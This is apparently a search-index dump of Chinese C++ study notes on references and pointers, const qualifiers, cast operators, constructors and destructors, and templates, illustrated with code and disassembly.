根据上面的小结，猜测Cpp为什么发明了引用类型：指针过于强大，对于新手，如果不能熟练地驾驭指针，使用时容易出错，出现不安全的行为（读到不该读的内容，程序崩溃）。于是Cpp提出了一个“弱化的指针”，发明了引用类型，引用类型保留了指针的优点（通过它就能读/修改指向变量/对象的值），同时增加了限制，让引用不能被二次赋值（防止乱指），不能做运算，这样避免了像使用指针时出现的错误。 GPT4写的关于引用和指针的区别，写得还可以C++中的引用（&amp;）是一个别名，它必须在声明时就初始化，并且一旦绑定到一个对象，就不能再绑定到另一个对象。引用不是一个可以存储地址的变量，而是被引用的变量的一个别名。123int a = 10;int&amp; ref = a; // ref是变量a的引用，之后不能再让ref引用其他变量// int&amp; ref2; // 错误：引用必须在声明时初始化C++中的指针是一个变量，它存储另一个变量的地址，并且可以在其生命周期内改变所指向的对象。123int a = 10;int* ptr = &amp;a; // ptr是一个指向int的指针，可以改变指向ptr++; // 合法操作，指针移动到下一个int的地址（如果有的话）个人理解：C++引用本质是指针常量（Constant Pointer）&amp;其实是指针常量（Constant Pointer），为了让代码少点*。然后使用引用时，等价像指针类型变量带上解引用符*p下面用指针常量（Constant Pointer）模拟实现引用行为，可以看到引用的写法更直接，语法更间接，不会出现指针的*号，和，解引用操作符*指针常量引用1234567891011121314#include &lt;iostream&gt;void increment(int* const ptr) // ptr是一个指针常量&#123; (*ptr)++; // 可以通过ptr修改它所指向的值&#125;int main() &#123; int value = 5; increment(&amp;value); // 传递value的地址给函数 std::cout &lt;&lt; value &lt;&lt; std::endl; // 输出结果将是6 return 0;&#125;1234567891011121314#include &lt;iostream&gt;void increment(int&amp; ref) // ref是value的引用&#123; ref++; // 直接通过ref修改value的值&#125;int main() &#123; int value = 5; increment(value); // 传递value的引用给函数 std::cout &lt;&lt; value &lt;&lt; std::endl; // 输出结果将是6 return 0;&#125;指针常量（Constant Pointer）：指针本身的值不能被修改（是常量），不能指向别的地址，但可以通过指针修改它指向的值。12345int value = 10;int anotherValue = 20;int* const ptr = &amp;value; // ptr是一个指向int的const指针，ptr不能指向别的地址*ptr = 15; // 正确：可以修改ptr指向的值// ptr = &amp;anotherValue; // 错误：不能改变ptr的指向还是将引用记为“弱化版的指针”，引用就是变量的别名而java中引用类型的引用，类似Cpp的指针，可以重新赋值，指向不同的对象，但没有指针运算，也没有直接的内存地址访问。和C++引用不同就是java的引用可以重新赋值，指向不同的对象是否有指针运算是否有直接的内存地址访问（*p）是否能重新指向另一个对象备注C++指针√√√C++引用×××就是变量/对象的别名Java引用××√ 引用类型作为函数参数 基本类型对象1234567891011121314#include &lt;stdio.h&gt;void Plus(int&amp; i)&#123; i++;&#125;int main()&#123; int i = 10; Plus(i); printf(&quot;%d &quot;, i); return 0;&#125; 传的是变量的地址，所以在Plus中会修改到i的值，而不是副本 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;class Base&#123;public: int x; int y; Base(int a, int b) &#123; this-&gt;x = a; this-&gt;y = b; &#125;&#125;;void PrintByRef(Base&amp; ref, Base* p)&#123; // 指针 printf(&quot;%d %d &quot;, p-&gt;x, p-&gt;y); // 引用 printf(&quot;%d %d &quot;, ref.x, ref.y); //指针可以重新赋值，做运算 //而对引用重新赋值，做运算，是对它代表的那个对象重新赋值，做运算&#125;int main()&#123; Base b(1, 2); PrintByRef(b, &amp;b); return 0;&#125; 反汇编看到调用PrintByRef压栈传参，函数内部读取对象x和y的反汇编代码是一样的。 但指针和引用还是有不一样的地方：指针可以重新赋值，做运算；而对引用重新赋值，做运算，是对它代表的那个对象重新赋值，做运算。 用对象类型引用指向基本类型的变量 正常引用用法： 1234567// 基本类型int x = 10;int&amp; ref1 = x;// 类Base b(1, 2);Base&amp; ref2 = b; int类型的对象，但是用Base类型给人家起别名： 123456789101112131415161718192021#include &lt;stdio.h&gt;class Base&#123;public: int x; int y;&#125;;int main()&#123; // 基本类型 int x = 10; //Base&amp; ref=x; //编译不过去，那我用下面一行，上强转 Base&amp; ref=(Base&amp;)x; ref++; //编译报错，受到限制 return 0;&#125; 如果用int&amp; ref=x起别名，ref代表基本类型x，是可以ref++的。限制反而用Base&amp;给人家起别名，加上强转，别名是起了，但是使用时受到限制，这样毫无意义。 小结 人家原来是什么类型的，就用什么类型的引用给人家起别名，这样才有意义。 常引用 表明该引用只读，不能通过这个引用来修改它指向的变量/对象的值 用途： 表明引用在这个函数中不会修改指向的变量/对象的值 让编译器帮助检查代码是否违反了const 1234567891011121314151617181920#include &lt;stdio.h&gt;class Base&#123;public: int x;&#125;;void Print(const Base&amp; ref)&#123; ref.x = 200; //编译器会报错 printf(&quot;%d &quot;, ref.x);&#125;int main()&#123; Base b; b.x = 100; return 0;&#125; 复习：const+指针常量指针（Pointer to Constant）（其英文表达是 “pointer to const” 或 “const pointer”，但为了避免混淆，通常不称其为 “const pointer”，因为这个表达可能会被误解为指针常量。）指针指向的数据不能被修改（常量），不能通过指针修改它指向的值，但指针本身可以修改，指向别的地址。12345int value = 10;int anotherValue = 20;const int* ptr = &amp;value; // ptr指向一个const int，不能通过ptr修改value的值// *ptr = 15; // 错误：不能修改ptr指向的值ptr = &amp;anotherValue; // 正确：ptr可以指向另一个地址指针常量（Constant Pointer）指针本身的值不能被修改（是常量），不能指向别的地址，但可以通过指针修改它指向的值。12345int value = 10;int anotherValue = 20;int* const ptr = &amp;value; // ptr是一个指向int的const指针，ptr不能指向别的地址*ptr = 15; // 正确：可以修改ptr指向的值// ptr = &amp;anotherValue; // 错误：不能改变ptr的指向常量指针常量（Constant Pointer to Constant）如果既不希望指针改变指向，也不希望通过指针修改指向的值，可以同时使用两种const。12345int value = 10;int anotherValue = 20;const int* const ptr = &amp;value; // ptr是一个指向const int的const指针// *ptr = 15; // 错误：不能修改ptr指向的值// ptr = &amp;anotherValue; // 错误：不能改变ptr的指向总结一下：const int* ptr 表示指针指向的是一个常量整数，不能通过指针来修改它指向的内容，但指针本身可以改变，指向其他的int变量。int* const ptr 表示指针本身是常量，不能指向其他的地址，但可以通过指针来修改它所指向的整数的值。const int* const ptr 表示指针本身是常量，且指向的整数也是常量，既不能通过指针修改值，也不能改变指针的指向。"},{"title":"强制类型转换运算符","path":"/wiki/C++/强制类型转换运算符.html","content":"强制类型转换运算符 参考：C++强制类型转换运算符（static_cast、reinterpret_cast、const_cast和dynamic_cast） C风格和C++风格的强制转换，e.g. 在C风格的类型转换中，将一个指针类型转换为另一个指针类型，是这样写： 1(NtQuerySystemInformation_t)GetProcAddress(hNtdll, &quot;NtQuerySystemInformation&quot;); 将 GetProcAddress 函数返回的 FARPROC 类型转换为 NtQuerySystemInformation_t类型。 在C++中，使用reinterpret_cast是这样写： 1reinterpret_cast&lt;NtQuerySystemInformation_t&gt;(GetProcAddress(hNtdll, &quot;NtQuerySystemInformation&quot;)); C为了兼容C语言，保留了C的老式做法：将类型名作为强制类型转换运算符。同时，C引入了新的强制类型转换机制，主要是为了克服C语言强制类型转换的以下三个缺点。 没有从形式上体现转换功能和风险的不同。 例如，将 int 强制转换成 double 是没有风险的，而将常量指针转换成非常量指针，将基类指针转换成派生类指针都是高风险的，而且后两者带来的风险不同（即可能引发不同种类的错误），C语言的强制类型转换形式对这些不同并不加以区分。 将多态基类指针转换成派生类指针时不检查安全性，即无法判断转换后的指针是否确实指向一个派生类对象。 难以在程序中寻找到底什么地方进行了强制类型转换。 强制类型转换是引发程序运行时错误的一个原因，因此在程序出错时，可能就会想到是不是有哪些强制类型转换出了问题。如果采用C语言的老式做法，要在程序中找出所有进行了强制类型转换的地方，显然是很麻烦的，因为这些转换没有统一的格式。而用 C++ 的方式，则只需要查找_cast字符串就可以了。甚至可以根据错误的类型，有针对性地专门查找某一种强制类型转换。例如，怀疑一个错误可能是由于使用了 reinterpret_cast 导致的，就可以只查找reinterpret_cast字符串。 C++ 强制类型转换运算符的用法如下： 1强制类型转换运算符 &lt;要转换到的类型&gt; (待转换的表达式) e.g. 1double d = static_cast &lt;double&gt; (3*5); //将 3*5 的值转换成实数 C++ 引入了四种功能不同的强制类型转换运算符以进行强制类型转换：static_cast、reinterpret_cast、const_cast 和 dynamic_cast。 static_cast static_cast 用于进行比较“自然”和低风险的转换，如整型和浮点型、字符型之间的互相转换。另外，如果对象所属的类重载了强制类型转换运算符 T（如 T 是 int、int* 或其他类型名），则 static_cast 也能用来进行对象到 T 类型的转换。 static_cast 不能用于在不同类型的指针之间互相转换，也不能用于整型和指针之间的互相转换，当然也不能用于不同类型的引用之间的转换。因为这些属于风险比较高的转换。 reinterpret_cast reinterpret_cast 用于进行各种不同类型的指针之间、不同类型的引用之间以及指针和能容纳指针的整数类型之间的转换。转换时，执行的是逐个比特复制的操作。 这种转换提供了很强的灵活性，但转换的安全性只能由程序员的细心来保证了。例如，程序员执意要把一个 int* 指针、函数指针或其他类型的指针转换成 string* 类型的指针也是可以的，至于以后用转换后的指针调用 string 类的成员函数引发错误，程序员也只能自行承担查找错误的烦琐工作：（C++ 标准不允许将函数指针转换成对象指针，但有些编译器，如 Visual Studio 2010，则支持这种转换）。 e.g. 123int a = 42;void* p = &amp;a;int* b = reinterpret_cast&lt;int*&gt;(p); 第二行：将一个 int 类型的变量 a 的地址 &amp;a 强制转换为 void* 类型的指针 p， 第三行：将 p 强制转换为 int* 类型的指针 b。 b 指向的是一个 int 类型的变量，我们可以通过 *b 访问该变量的值，在这个例子中是42。 const_cast const_cast 运算符仅用于进行去除 const 属性的转换，它也是四个强制类型转换运算符中唯一能够去除 const 属性的运算符。 将 const 引用转换为同类型的非 const 引用，将 const 指针转换为同类型的非 const 指针时可以使用 const_cast 运算符。 dynamic_cast 用 reinterpret_cast 可以将多态基类（包含虚函数的基类）的指针强制转换为派生类的指针，但是这种转换不检查安全性，即不检查转换后的指针是否确实指向一个派生类对象。dynamic_cast专门用于将多态基类的指针或引用强制转换为派生类的指针或引用，而且能够检查转换的安全性。对于不安全的指针转换，转换结果返回 NULL 指针。 dynamic_cast 是通过“运行时类型检查”来保证安全性的。dynamic_cast 不能用于将非多态基类的指针或引用强制转换为派生类的指针或引用——这种转换没法保证安全性，只好用 reinterpret_cast 来完成。"},{"title":"构造函数和析构函数","path":"/wiki/C++/构造函数和析构函数.html","content":"构造函数和析构函数 函数名 返回值 参数 函数个数 什么时候执行 用途 备注 必须要有吗 构造函数 类名() 不能有 可以有 可以有多个，参数要不同，（重载） 在对象创建时执行 用于初始化工作 你希望对象创建时做些什么？ 编译器不要求必须提供 析构函数 ~类名() 不能有 不能有 只能有1个 在对象销毁前执行 用于清理工作 编译器不要求必须提供 析构函数只能有1个，不能重载，原因： 没有必要 析构函数是对象即将销毁前由系统调用的（系统调用：编译器编译时替我们生成了调用析构函数的代码），如果重载了，系统怎么知道调用哪个析构函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;struct Person &#123; int age; int level; char* arr; Person() // Default constructor &#123; printf(&quot;Default constructor called... &quot;); // Called when an object is created without any arguments &#125; Person(int age, int level) // Parameterized constructor &#123; printf(&quot;Parameterized constructor called... &quot;); // Called when an object is created with age and level arguments this-&gt;age = age; this-&gt;level = level; arr = (char*)malloc(1024); &#125; ~Person() // Destructor &#123; printf(&quot;Destructor called... &quot;); // Called when an object goes out of scope or is deleted free(arr); arr = NULL; &#125; &#125;; Person g_p; // Global object, default constructor called at program startupint main()&#123; Person p1; // Local object, default constructor called here Person p2(1, 2); // Local object, parameterized constructor called here // Destructor will be called for p2 then p1 at the end of this scope (end of main) return 0;&#125; // Destructor will be called for g_p at program termination Destructor will be called for p2 then p1 at the end of this scope (end of main)这句看不懂？在这句英文中，“then”是一个副词，用来表示时间顺序。它在这里连接两个动作，说明第一个动作（调用p2的析构函数）发生在第二个动作（调用p1的析构函数）之前。这个词通常用于描述一系列按顺序发生的事件。因此，这句话的结构可以分解为：“Destructor will be called for p2” — 这是第一个独立的句子，说明p2的析构函数将会被调用。“then” — 副词，用来连接两个事件，指出它们的顺序关系。“Destructor will be called for p1” — 这是第二个独立的句子，说明p1的析构函数将会在p2之后被调用。整句话的意思是，当main()函数的作用域结束时，首先p2的析构函数会被调用，紧接着p1的析构函数也会被调用。 变量age，level，arr在栈中，栈帧没了就释放掉了。但是析构函数Person()里用malloc向堆申请的1024字节大小的空间并没释放，所以要自己手动释放。释放写在哪？按以前C的想法，谁使用，谁释放，比如下面的代码，fun1()函数里可能用到arr，函数快结束便free(arr)，fun2()函数里也可能用到arr，函数快结束便free(arr)。麻烦点来了，如果多次调用了fun1()和fun2()，就会导致arr多次释放。那什么时候释放？即使这些函数里都用到了arr，但我们不确定程序要调用多少次，唯一能确定的是这个对象准备不用时，arr需要释放，所以在析构函数中free(arr)。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt;struct Person &#123; int age; int level; char* arr; Person() &#123; printf(&quot;Default constructor called... &quot;); &#125; Person(int age, int level) &#123; printf(&quot;Parameterized constructor called... &quot;); this-&gt;age = age; this-&gt;level = level; arr = (char*)malloc(1024); &#125; ~Person() // Destructor &#123; &#125; void fun1() &#123; //... free(arr); &#125; void fun2() &#123; //... free(arr); &#125; &#125;; int main()&#123; Person p; p.fun1(); p.fun2(); //麻烦了，对arr又进行free return 0;&#125; 子类对象构造和析构的调用链 子类对象实例化时，子类构造函数中会call父类的构造函数，反汇编能跟进去看到 未来再整理： 子类构造函数的写法 参考：C++继承中关于子类构造函数的写法 重新梳理： 子类无构造函数， 子类无构造函数时的默认行为：如果子类没有显式定义任何构造函数，编译器会自动调用父类的无参数构造函数来初始化继承的成员。 子类定义构造函数时的行为： 如果子类定义了构造函数（无论是无参数还是带参数），在创建子类对象时，会首先调用父类的无参数构造函数，然后调用子类的构造函数。 子类构造函数中显式调用父类构造函数： 如果子类的构造函数中显式地调用了父类的构造函数（无论是默认的还是带参数的），则按照子类构造函数中的指示调用相应的父类构造函数。 父类只有带参数构造函数时的子类构造函数： 如果父类只提供了带参数的构造函数，没有无参数的默认构造函数，那么子类必须在其构造函数中显式调用父类的带参数构造函数，否则会编译错误。 虚继承中的构造函数调用： 在虚继承的情况下，最底层的派生类负责调用虚基类的构造函数。如果不显式调用，编译器会尝试调用虚基类的默认构造函数。如果虚基类没有默认构造函数，将导致编译错误。 虚继承，后面估计会讲 子类无构造函数子类定义了构造函数（无参或有参）父类只有带参数构造函数父类只有带参数构造函数时的子类构造函数 构造函数情况 父类 只有无参数构造函数（显式写明或编译器自动加的） 子类 没有定义任何构造函数 子类对象实例化：子类的构造函数会，自动调用父类的无参数构造函数来初始化继承的成员 12345678910111213141516171819202122232425class Base&#123;private: int x;public: Base() // 父类的无参构造函数 &#123; &#125;&#125;;class Derived : public Base&#123;private: int y; // 没有构造函数&#125;;int main()&#123; Derived d; // 子类的无参构造会调用Base的默认无参构造函数 return 0;&#125; 构造函数情况 父类 只有无参数构造函数（显式写明或编译器自动加的） 子类 定义了构造函数（无参或有参） 子类用无参构造函数实例化：子类的无参构造函数会调用父类的无参constructor 子类用带参构造函数实例化：子类的带参构造函数会调用父类的无参constructor 12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: Base() // 父类的无参构造函数 &#123; this-&gt;x = 0; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived() // 子类的无参构造函数 &#123; &#125; Derived(int y) // 子类的有参构造函数 &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1; // 子类的无参构造函数会调用父类的无参constructor Derived d2(2); // 子类的带参构造函数会调用父类的无参constructor return 0;&#125; Derived d1Derived d2(2) 构造函数情况 父类 只有带参构造函数 子类 定义了构造函数（无参或有参） 父类写了带参构造函数，没写无参构造函数。 子类的构造函数的initialization没有显式调用父类带参构造函数，编译会出错：找不到无参构造函数。 因为子类对象实例化时会默认找Base的无参构造函数，而Base又只写了带参构造函数。 12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: // 没有无参构造函数 Base(int x) // 父类的带参构造函数 &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived() // 子类的无参构造函数 &#123; &#125; Derived(int y) // 子类的有参构造函数 &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d2(2); // 子类的带参构造函数会调用父类的无参constructor，但找不到，编译报错 return 0;&#125; Derived()和Derived(int y)两个都要调Base()，所以编译报错是两条 解决办法： Base加上无参构造函数 子类构造函数initialization指明调用父类带参构造函数 Base加上无参构造函数子类构造函数initialization显示调用父类带参构造函数123456789101112131415161718192021222324252627282930313233343536class Base&#123;private: int x;public: Base() // 父类的无参构造函数 &#123; &#125; Base(int x) // 父类的带参构造函数 &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived() // 子类的无参构造函数 &#123; &#125; Derived(int y) // 子类的有参构造函数 &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d2(2); // 子类的带参构造函数会调用父类的无参constructor return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435class Base&#123;private: int x;public: // 没有无参构造函数 Base(int x) // 父类的带参构造函数 &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x) : Base(x) // 子类的无参构造函数 &#123; &#125; Derived(int x, int y) : Base(x) // 子类的有参构造函数 &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1(1); // 子类的带参构造函数会调用父类的有参constructor（显示指明了） Derived d2(1, 2); // 子类的带参构造函数会调用父类的有参constructor（显示指明了） return 0;&#125;虚继承中的构造函数调用 小结 子类对象实例化时，子类构造函数里会调用父类构造函数（只有在initialization中能修改调父类的哪个构造函数） 如果initialization有显示调用父类构造函数，就会先调用initialization中指明的父类构造函数 如果没显示调用父类构造函数，编译器就会默认调用父类无参构造函数 如果父类写了带参构造函数，没声明无参构造函数，编译会报错 如果父类写了无参构造函数，或没写（编译器会自动加上），运行正常 好习惯：每写一个类，就把无参构造函数写上，避免无谓的编译错误 显示调用父类构造函数为什么只能放initialization中 错误的，放子类构造函数体体中正确的，放initialization中12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: Base() // 父类的无参构造函数 &#123; &#125; Base(int x) // 父类的带参构造函数 &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) &#123; Base::Base(x); this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1(1, 2); return 0;&#125; 可以发现问题： 还是默认调用了父类Base无参的构造函数 Base::Base(x)传参的是个临时对象[ebp-8]（而不是d1对象的this指针），根本没改到d1对象的x的值，当Derived函数调用完毕，这个临时对象就被释放了 12345678910111213141516171819202122232425262728293031323334class Base&#123;private: int x;public: Base() // 父类的无参构造函数 &#123; &#125; Base(int x) // 父类的带参构造函数 &#123; this-&gt;x = x; &#125;&#125;;class Derived : public Base&#123;private: int y;public: Derived(int x, int y) : Base(x) // 子类的有参构造函数 &#123; this-&gt;y = y; &#125;&#125;;int main()&#123; Derived d1(1, 2); // 子类的带参构造函数会调用父类的有参constructor（显示指明了） return 0;&#125; d1对象实例化时调用子类的有参构造函数传了三个参数：2，1，d1对象的this指针 调用Base带参构造函数时传了两个参数：1，d1对象的this指针 Base带参构造函数中通过d1对象的this指针将成员x赋值为1"},{"title":"模板","path":"/wiki/C++/模板.html","content":"前言 假设写了一个针对int类型数组的冒泡排序，现在也想让这个冒泡排序对char类型数组也能用。两份代码逻辑上一样，只是数据类型不一样。这也是相同的轮子，重复的代码。如何减少重复造轮子的工作，答案是模板 针对int类型数据的冒泡排序针对char类型数据的冒泡排序123456789101112131415161718192021222324void Sort(int* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; int temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); return 0;&#125;123456789101112131415161718192021222324void Sort(char* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; char temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; char carr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(carr, 7); return 0;&#125; 函数模板 语法格式 从C++98标准开始，可以用typename关键字来声明模板参数，作为class的一个可替代选项，为了使语义更清晰和更准确 写法一写法一建议用写法一，可读性更好 12345template&lt;class 形参名, class 形参名, ...&gt;返回类型 函数名(参数列表) &#123; 函数体;&#125;1234template&lt;class 形参名, class 形参名, ...&gt; 返回类型 函数名(参数列表) &#123; 函数体;&#125; 例1：针对基本数据类型的模板 在函数前加上template，形参名是自己起的一个名字，将需要变化的数据类型替换为形参名，编译器在函数模板实例化时会帮我们替换好。如此，Sort函数就支持任意数据类型的数组了。如果没有模板，需要手动写很多个Sort，它们仅仅是换了数据类型，比如一个针对int类型数组，一个针对char类型数组。 12345678910111213141516171819202122232425262728template&lt;class T&gt;void Sort(T* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; T temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); //int类型的Sort函数实例化 char carr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(carr, 7); //char类型的Sort函数实例化 return 0;&#125; 例2：针对自定义数据类型的模板 将冒泡排序用于自己定义的类。两个类的比较，类&gt;类，编译器无法理解&gt;这个符号，所以需要对&gt;重载运算符 1234567891011121314151617181920212223242526272829303132333435363738394041class Base&#123;private: int x; int y;public: Base(int x, int y) : x(x), y(y) &#123;&#125; bool operator&gt;(Base &amp;b) // 重载&gt;运算符 &#123; return this-&gt;x &gt; b.x &amp;&amp; this-&gt;y &gt; b.y; // 两个都大，就算这个类大 &#125;&#125;;template &lt;class T&gt;void Sort(T* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; T temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; Base b1(1, 1), b2(3, 3), b3(2, 2), b4(5, 5), b5(4, 4); Base barr3[] = &#123;b1, b2, b3, b4, b5&#125;; Sort(barr3, 5); //函数模板实例化 return 0;&#125; 函数模板的本质 回到上面的例1 函数模板并没有创建函数，只有当调用时，知道了用哪个具体类型进行替换，编译器就会帮我们写一份这个类型的函数。 反汇编看到对int数据的Sort函数函数地址在：0040100a 反汇编看到对char数据的Sort函数函数地址在：00401005 这是两个不同的函数 也就是说，编译器会在知道具体传入类型时替我们来写这个函数。 用函数模板生成的对int类型数据的Sort函数，其反汇编和直接写的void Sort(int* arr, int nLength)是一样的 直接写的int_Sorttemplate生成的int_Sort123456789101112131415161718192021222324void Sort(int* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; int temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); return 0;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172731: void Sort(int* arr, int nLength)2: &#123;0040D3F0 push ebp0040D3F1 mov ebp,esp0040D3F3 sub esp,4Ch0040D3F6 push ebx0040D3F7 push esi0040D3F8 push edi0040D3F9 lea edi,[ebp-4Ch]0040D3FC mov ecx,13h0040D401 mov eax,0CCCCCCCCh0040D406 rep stos dword ptr [edi]3: int i, k;4: for (i = 0; i &lt; nLength; i++)0040D408 mov dword ptr [ebp-4],00040D40F jmp Sort+2Ah (0040d41a)0040D411 mov eax,dword ptr [ebp-4]0040D414 add eax,10040D417 mov dword ptr [ebp-4],eax0040D41A mov ecx,dword ptr [ebp-4]0040D41D cmp ecx,dword ptr [ebp+0Ch]0040D420 jge Sort+97h (0040d487)5: &#123;6: for (k = 0; k &lt; nLength - 1 - i; k++)0040D422 mov dword ptr [ebp-8],00040D429 jmp Sort+44h (0040d434)0040D42B mov edx,dword ptr [ebp-8]0040D42E add edx,10040D431 mov dword ptr [ebp-8],edx0040D434 mov eax,dword ptr [ebp+0Ch]0040D437 sub eax,10040D43A sub eax,dword ptr [ebp-4]0040D43D cmp dword ptr [ebp-8],eax0040D440 jge Sort+95h (0040d485)7: &#123;8: if (arr[k] &gt; arr[k + 1])0040D442 mov ecx,dword ptr [ebp-8]0040D445 mov edx,dword ptr [ebp+8]0040D448 mov eax,dword ptr [ebp-8]0040D44B mov esi,dword ptr [ebp+8]0040D44E mov ecx,dword ptr [edx+ecx*4]0040D451 cmp ecx,dword ptr [esi+eax*4+4]0040D455 jle Sort+93h (0040d483)9: &#123;10: int temp = arr[k];0040D457 mov edx,dword ptr [ebp-8]0040D45A mov eax,dword ptr [ebp+8]0040D45D mov ecx,dword ptr [eax+edx*4]0040D460 mov dword ptr [temp],ecx11: arr[k] = arr[k + 1];0040D463 mov edx,dword ptr [ebp-8]0040D466 mov eax,dword ptr [ebp+8]0040D469 mov ecx,dword ptr [ebp-8]0040D46C mov esi,dword ptr [ebp+8]0040D46F mov ecx,dword ptr [esi+ecx*4+4]0040D473 mov dword ptr [eax+edx*4],ecx12: arr[k + 1] = temp;0040D476 mov edx,dword ptr [ebp-8]0040D479 mov eax,dword ptr [ebp+8]0040D47C mov ecx,dword ptr [temp]0040D47F mov dword ptr [eax+edx*4+4],ecx13: &#125;14: &#125;0040D483 jmp Sort+3Bh (0040d42b)15: &#125;0040D485 jmp Sort+21h (0040d411)16: &#125;0040D487 pop edi0040D488 pop esi0040D489 pop ebx0040D48A mov esp,ebp0040D48C pop ebp0040D48D ret1234567891011121314151617181920212223242526template&lt;class T&gt;void Sort(T* arr, int nLength)&#123; int i, k; for (i = 0; i &lt; nLength; i++) &#123; for (k = 0; k &lt; nLength - 1 - i; k++) &#123; if (arr[k] &gt; arr[k + 1]) &#123; T temp = arr[k]; arr[k] = arr[k + 1]; arr[k + 1] = temp; &#125; &#125; &#125;&#125;int main()&#123; int iarr[] = &#123;1, 4, 6, 2, 9, 8, 7&#125;; Sort(iarr, 7); //int类型的Sort函数实例化 return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273741: template&lt;class T&gt;2: void Sort(T* arr, int nLength)3: &#123;004010F0 push ebp004010F1 mov ebp,esp004010F3 sub esp,4Ch004010F6 push ebx004010F7 push esi004010F8 push edi004010F9 lea edi,[ebp-4Ch]004010FC mov ecx,13h00401101 mov eax,0CCCCCCCCh00401106 rep stos dword ptr [edi]4: int i, k;5: for (i = 0; i &lt; nLength; i++)00401108 mov dword ptr [ebp-4],00040110F jmp Sort+2Ah (0040111a)00401111 mov eax,dword ptr [ebp-4]00401114 add eax,100401117 mov dword ptr [ebp-4],eax0040111A mov ecx,dword ptr [ebp-4]0040111D cmp ecx,dword ptr [ebp+0Ch]00401120 jge Sort+97h (00401187)6: &#123;7: for (k = 0; k &lt; nLength - 1 - i; k++)00401122 mov dword ptr [ebp-8],000401129 jmp Sort+44h (00401134)0040112B mov edx,dword ptr [ebp-8]0040112E add edx,100401131 mov dword ptr [ebp-8],edx00401134 mov eax,dword ptr [ebp+0Ch]00401137 sub eax,10040113A sub eax,dword ptr [ebp-4]0040113D cmp dword ptr [ebp-8],eax00401140 jge Sort+95h (00401185)8: &#123;9: if (arr[k] &gt; arr[k + 1])00401142 mov ecx,dword ptr [ebp-8]00401145 mov edx,dword ptr [ebp+8]00401148 mov eax,dword ptr [ebp-8]0040114B mov esi,dword ptr [ebp+8]0040114E mov ecx,dword ptr [edx+ecx*4]00401151 cmp ecx,dword ptr [esi+eax*4+4]00401155 jle Sort+93h (00401183)10: &#123;11: T temp = arr[k];00401157 mov edx,dword ptr [ebp-8]0040115A mov eax,dword ptr [ebp+8]0040115D mov ecx,dword ptr [eax+edx*4]00401160 mov dword ptr [temp],ecx12: arr[k] = arr[k + 1];00401163 mov edx,dword ptr [ebp-8]00401166 mov eax,dword ptr [ebp+8]00401169 mov ecx,dword ptr [ebp-8]0040116C mov esi,dword ptr [ebp+8]0040116F mov ecx,dword ptr [esi+ecx*4+4]00401173 mov dword ptr [eax+edx*4],ecx13: arr[k + 1] = temp;00401176 mov edx,dword ptr [ebp-8]00401179 mov eax,dword ptr [ebp+8]0040117C mov ecx,dword ptr [temp]0040117F mov dword ptr [eax+edx*4+4],ecx14: &#125;15: &#125;00401183 jmp Sort+3Bh (0040112b)16: &#125;00401185 jmp Sort+21h (00401111)17: &#125;00401187 pop edi00401188 pop esi00401189 pop ebx0040118A mov esp,ebp0040118C pop ebp0040118D ret 结构体/类模板 语法格式 写法一写法一建议用写法一，可读性更好 1234template&lt;class 形参名, class 形参名, ...&gt;class 类名 &#123; ...;&#125;1234template&lt;class 形参名, class 形参名, ...&gt; class 类名 &#123; ...;&#125; 模板化前的类改写后的类模板Base类只支持int和char类型 1234567891011121314151617181920class Base&#123;public: int a; int b; char x; char y;public: int Max() &#123; return a &gt; b ? a : b; &#125; char Min() &#123; return x &gt; y ? y : 